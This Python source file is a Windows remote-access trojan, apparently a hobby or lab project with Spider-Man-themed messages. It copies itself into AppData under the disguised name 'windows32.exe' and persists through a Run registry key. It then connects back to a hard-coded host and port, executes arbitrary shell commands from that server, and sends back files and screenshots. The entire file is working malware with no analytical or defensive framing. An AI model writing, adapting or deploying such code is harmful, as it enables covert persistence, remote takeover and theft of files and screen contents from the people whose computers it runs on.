import socket
import subprocess
import os
import shutil
import sys
from PIL import ImageGrab
import tempfile
import time

def registry():
    location = os.environ['appdata']+'\\windows32.exe'
    if not os.path.exists(location):
        shutil.copyfile(sys.executable, location + '\\')
        subprocess.call(r'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v WallCrawlingMenace /t REG_SZ /d "' + location + '"', shell=True)
        print('hello')

def transfer(s, path):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(5000)
        while len(packet) > 0:
            s.send(packet)
            packet = f.read(1024)
        f.close()
        s.send('DONE'.encode())
    else:
        s.send('File not found'.encode())

def connecting():
    registry () # call registry function
    connection_established = False
    while not connection_established:
        try:
            s = socket.socket()
            s.connect(("192.168.153.128", 8080))
            connection_established = True
            print('Good soup')
        except ConnectionRefusedError as e:
            print(f'Connection failed because of {e}. Retrying in 5...')
            s.close()
            time.sleep(5)
        except Exception as e:
            print(e)
            s.close()
            time.sleep(5)

    while True:
        command = s.recv(5000)

        if 'terminate' in command.decode():
            s.close()
            break
        elif 'grab' in command.decode():
            grab, path = command.decode().split("*")
            try:
                transfer(s, path)
            except:
                pass
        elif 'screencap' in command.decode():
            dirpath = tempfile.mkdtemp()

            ImageGrab.grab().save(dirpath + r"\img.jpg", "JPEG")
            transfer(s, dirpath + r"\img.jpg")
            shutil.rmtree(dirpath)
        elif 'cd' in command.decode():
            try:
                code, directory = command.decode().split(" ",1)
                os.chdir(directory)
                informToServer = 'Swinging to ' + os.getcwd()
                s.send(informToServer.encode())
            except Exception as e:
                informToServer = 'OUT OF WEB FLUID!! ' + str(e)
                s.send(informToServer.encode())

        else:
            CMD = subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s.send(CMD.stderr.read())
            s.send(CMD.stdout.read())

def main():
    connecting()
main()